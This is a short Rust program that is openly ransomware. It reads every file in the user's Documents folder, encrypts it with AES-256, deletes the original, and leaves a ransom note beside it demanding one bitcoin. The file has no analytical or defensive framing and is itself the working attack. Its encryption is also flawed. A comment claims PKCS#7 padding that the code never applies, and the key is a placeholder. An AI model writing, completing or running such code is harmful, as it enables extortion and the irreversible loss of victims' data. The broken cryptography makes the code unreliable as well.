use dirs::home_dir;
use std::error::Error;
use std::fs;
use std::path::PathBuf;
use std::io::prelude::*;

use aes::Aes256;
use cipher::{KeyInit, BlockEncrypt};
use rand::rngs::OsRng;
use rand::RngCore;

fn encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut iv = [0u8; 16];
    OsRng.fill_bytes(&mut iv); // generate a random IV

    let cipher = Aes256::new(key.into());
    let mut block = iv;
    let mut encrypted_data = Vec::new();

    // encrypt the data in CBC mode with PKCS#7 padding
    for chunk in data.chunks(16) {
        // XOR the previous block with the current plaintext block
        block.iter_mut().zip(chunk.iter())
            .for_each(|(b, &d)| *b ^= d);
        
        // encrypt the result and append it to the output
        let mut block_array = [0u8; 16];
        block_array.copy_from_slice(&block);
        cipher.encrypt_block((&mut block_array).into());
        encrypted_data.extend_from_slice(&block_array);
    }

    // append the IV to the output
    encrypted_data.extend_from_slice(&iv);
    encrypted_data
}


fn main() -> Result<(), Box<dyn Error>> {
	let ransom_note = "YOUR FILES ARE ENCRYPTED. PAY 1 BITCOIN TO THE FOLLOWING ADDRESS TO GET THE DECRYPTION KEY.";
	let encrypted_extension = ".encrypted";
	let key = "INSERT_DECRYPTION_KEY_HERE";

	let target_dir = format!(
		"{}\\Documents",
		home_dir().unwrap_or("~".into()).to_string_lossy()
	);
	println!("{}", target_dir);

	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let entry = entry?;
		let path = entry.path();

		if path.is_file() {
			let file_name = path.file_name().unwrap().to_str().unwrap();

			if !file_name.ends_with(encrypted_extension) {
				let mut file = fs::File::open(&path)?;
				let mut contents = Vec::new();
				file.read_to_end(&mut contents)?;

				let encrypted_path =
					PathBuf::from(format!("{}{}", path.display(), encrypted_extension));
				fs::write(&encrypted_path, encrypt(&contents[..], key.as_bytes()))?;

				fs::remove_file(&path)?;

				let mut ransom_file =
					fs::File::create(format!("{}{}", encrypted_path.display(), ".ransom"))?;
				ransom_file.write_all(ransom_note.as_bytes())?;
			}
		}
	}

	Ok(())
}
